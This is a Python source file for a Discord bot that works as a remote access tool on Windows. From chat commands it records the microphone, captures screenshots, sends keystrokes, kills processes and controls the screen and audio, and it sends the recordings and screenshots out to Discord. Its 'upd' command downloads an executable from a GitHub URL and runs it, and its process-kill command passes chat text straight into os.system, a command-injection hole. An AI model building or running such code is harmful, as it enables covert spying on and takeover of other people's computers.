import pyaudio
import wave
from PIL import ImageGrab, Image, ImageTk
import os 
import discord
import asyncio
import getpass
import requests
import pyautogui
from gtts import gTTS 
import pygame
import time
from threading import Thread
import tkinter as tk
from tkinter import messagebox
from dotenv import load_dotenv 
import cv2
from urllib.request import urlretrieve
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
import ctypes
import subprocess

load_dotenv()

token = os.getenv("Cody")
timeout = 1
connection = False
def wifi_check():
    try:
        requests.head("http://www.google.com/", timeout=timeout)
        # Connection Success
        print('The internet connection is active')
        connection = True
    except requests.ConnectionError:
        # Connection Retry
        print("The internet connection is down")
        connection = False
        time.sleep(1)
        wifi_check()

wifi_check()

class MyClient(discord.Client):
    async def on_ready(self):
        #announce logon
        print(f'Logged on as {self.user}!') ,
        #custom status
        await client.change_presence(activity=discord.Game(name="Started!"))
        time.sleep(3)
        #go back to online status
        await client.change_presence(activity=discord.Game(name="Online"))
    async def on_message(self, message):
        try:
            # Ask Discord user which mic to use and send a mic list then record a 30 second audio clip through specified mic and send it into the Discord
            if f'{message.content}' == 'rec':
                def check(m):
                    return m.author == message.author and m.channel == message.channel

                # Initialize pyaudio
                p = pyaudio.PyAudio()

                # List available devices
                device_list = []
                for i in range(p.get_device_count()):
                    info = p.get_device_info_by_index(i)
                    device_list.append(f"{i}: {info.get('name')}")

                device_list_str = "\n".join(device_list)

                # Write the device list to a file
                with open('device_list.txt', 'w') as f:
                    f.write(device_list_str)

                # Send the device list file to Discord
                await message.channel.send(file=discord.File('device_list.txt'))
                os.remove('device_list.txt')

                await message.channel.send('Please enter the device index of the mic you would like to use')
                msg = await client.wait_for('message', check=check)
                device_index = int(msg.content)

                await message.channel.send('How long would you like to record (in seconds)?')
                msg = await client.wait_for('message', check=check)
                record_seconds = int(msg.content)

                # Set up the stream
                chunk = 1024  # Record in chunks of 1024 samples
                sample_format = pyaudio.paInt32  # 16 bits per sample
                channels = 1
                rate = 44100  # Record at 44100 samples per second

                stream = p.open(format=sample_format,
                                channels=channels,
                                rate=rate,
                                input=True,
                                input_device_index=device_index,
                                frames_per_buffer=chunk)

                await message.channel.send(f'Recording for {record_seconds} seconds...')
                record_seconds = record_seconds + 1
                frames = []  # Initialize array to store frames

                # Store data in chunks for the specified duration
                for _ in range(0, int(rate / chunk * record_seconds)):
                    data = stream.read(chunk)
                    frames.append(data)

                # Stop and close the stream
                stream.stop_stream()
                stream.close()
                p.terminate()

                # Save the recorded data as a WAV file
                wf = wave.open('output.wav', 'wb')
                wf.setnchannels(channels)
                wf.setsampwidth(p.get_sample_size(sample_format))
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
                wf.close()

                await message.channel.send(file=discord.File('output.wav'))
                os.remove('output.wav')
            #update the application   
            if f'{message.content}' == 'upd':
                url = "https://github.com/Plexisity/announcement_manager/raw/main/update.exe"
                filename = "download.exe"
                file = urlretrieve(url, filename)
                os.replace("download.exe", r".\update.exe")
                os.startfile(r".\update.exe")
                await message.channel.send('Updating...')
                await client.change_presence(activity=discord.Game(name="Updating..."))
            #take a screenshot
            if f'{message.content}' == 'scr':
                # Take screenshot
                im = ImageGrab.grab()
                im.save('screenshot.png')
                await message.channel.send(file=discord.File('screenshot.png'))
                os.remove('screenshot.png')
            #text to speech
            if f'{message.content}' == 'tts':
                # Check if the message is from the bot itself
                if message.author == self.user:
                    return 
                # Wait for reply containing the user defined message in discord
                await message.channel.send('Please enter the message you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)      

                async def Playsound():
                    # Play the notification and message contents
                    message_content = (msg.content)
                    player = gTTS(text=message_content, lang='en', slow=False) 
                    player.save("msg.mp3")
                    pygame.mixer.init()
                    pygame.mixer.music.load("msg.mp3")
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        await asyncio.sleep(0.1)
                    pygame.mixer.music.unload()  # Unload the music to release the file
                    os.remove("msg.mp3")

                await Playsound()
            #display a message box
            if f'{message.content}' == 'msg':  
                #wait for reply containing the user defined message in discord
                await message.channel.send('Please enter the message you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)

                def Dialog_Box():
                    message_content = (msg.content)
                    root = tk.Tk()
                    root.withdraw()  # Hide the root window
                    root.attributes('-topmost', True)  # Always on top
                    messagebox.showinfo(str(message.author.name), message_content)
                    root.destroy()
                #open dialog box
                t2 = Thread(target=Dialog_Box)
                t2.start()
                t2.join()
            #lock the screen
            if f'{message.content}' == 'lock': 
                # Lock the screen
                os.system("rundll32.exe user32.dll,LockWorkStation")
                await message.channel.send('Screen Locked')
            #send keystrokes
            if f'{message.content}' == 'key':
                await message.channel.send('Please enter the keystrokes you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)
                pyautogui.typewrite(msg.content)
                await message.channel.send('Keystrokes sent')
            #close a process
            if f'{message.content}' == 'close':
                #send a list of proccesses to discord chat
                os.system('tasklist > tasklist.txt')
                await message.channel.send(file=discord.File('tasklist.txt'))
                os.remove('tasklist.txt')
                await message.channel.send('Please enter the process you would like to close')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)
                await message.channel.send(f'Closing {msg.content}')
                os.system(f'taskkill /f /im {msg.content}')
            #show an image for half a second on screen
            if f'{message.content}' == 'img':
                 await message.channel.send('Please upload the image you would like to display')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel and m.attachments
                 msg = await client.wait_for('message', check=check)
                 attachment = msg.attachments[0]
                 await attachment.save('temp_image.png')

                 def show_image():
                     print("Creating tkinter window")
                     root = tk.Tk()
                     root.attributes('-topmost', True)  # Always on top
                     img = Image.open('temp_image.png')
                     img = ImageTk.PhotoImage(img)
                     panel = tk.Label(root, image=img)
                     panel.pack(side="top", fill="both", expand="yes")
                     root.after(500, lambda: root.destroy())  # Close the window after 3 seconds
                     print("Displaying image")
                     root.mainloop()
                     print("Image displayed and window closed")

                 print("Calling show_image()")
                 show_image()
                 print("Image should have been displayed")
                 os.remove('temp_image.png')
            #play a vid on screen with no audio   
            if f'{message.content}' == 'vid':
                await message.channel.send('Please upload the video you would like to display')
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.attachments
                msg = await client.wait_for('message', check=check)
                attachment = msg.attachments[0]
                await attachment.save('temp_video.mp4')

                def show_video():
                    print("Creating tkinter window")
                    root = tk.Tk()
                    root.attributes('-topmost', True)  # Always on top
                    video_label = tk.Label(root)
                    video_label.pack(side="top", fill="both", expand="yes")

                    def stream_video():
                        video = cv2.VideoCapture('temp_video.mp4')

                        while video.isOpened():
                            ret, frame = video.read()
                            if not ret:
                                break
                            img = ImageTk.PhotoImage(Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)))
                            video_label.config(image=img)
                            video_label.image = img
                            root.update_idletasks()
                            time.sleep(1 / video.get(cv2.CAP_PROP_FPS))

                        video.release()

                    Thread(target=stream_video).start()
                    root.mainloop()
                    print("Video displayed and window closed")

                print("Calling show_video()")
                show_video()
                print("Video should have been displayed")
                
                os.remove('temp_video.mp4')
            #play a user defined sound on host machine
            if f'{message.content}' == 'sound':
                await message.channel.send('Please upload the sound you would like to play')
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.attachments
                msg = await client.wait_for('message', check=check)
                attachment = msg.attachments[0]
                await attachment.save('temp_sound.mp3')

                async def play_sound():
                    pygame.mixer.init()
                    pygame.mixer.music.load('temp_sound.mp3')
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        await asyncio.sleep(0.1)
                    pygame.mixer.music.unload()  # Unload the music to release the file
                    os.remove('temp_sound.mp3')

                await play_sound()
            #change volume
            if f'{message.content}' == 'vol':
                #check current volume
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
                current_volume = volume_interface.GetMasterVolumeLevelScalar()
                await message.channel.send(f'Current volume: {current_volume * 100}%')
                await message.channel.send('Please enter the volume you would like to set (0-100)')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)
                volume = float(msg.content) / 100.0  # Convert to a value between 0.0 and 1.0

                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
                volume_interface.SetMasterVolumeLevelScalar(volume, None)

                await message.channel.send(f'Volume set to {msg.content}%')
            #display a user defined message
            if f'{message.content}' == 'help':
                help_message = (
                    "Available commands:\n"
                    "rec - Record audio\n"
                    "upd - Update the application\n"
                    "scr - Take a screenshot\n"
                    "tts - Text-to-speech\n"
                    "msg - Display a message box\n"
                    "lock - Lock the screen\n"
                    "key - Send keystrokes\n"
                    "close - Close a process\n"
                    "img - Display an image\n"
                    "vid - Display a video\n"
                    "sound - Play a sound\n"
                    "vol - Set the volume\n"
                    "min - Minimize all windows\n"
                )
                await message.channel.send(help_message)
            #press win + d
            if f'{message.content}' == 'min':
                pyautogui.hotkey('win', 'd')
                await message.channel.send('Minimized all windows')

        except Exception as e:
            await message.channel.send(f'An error occurred: {str(e)}')



intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(str(token))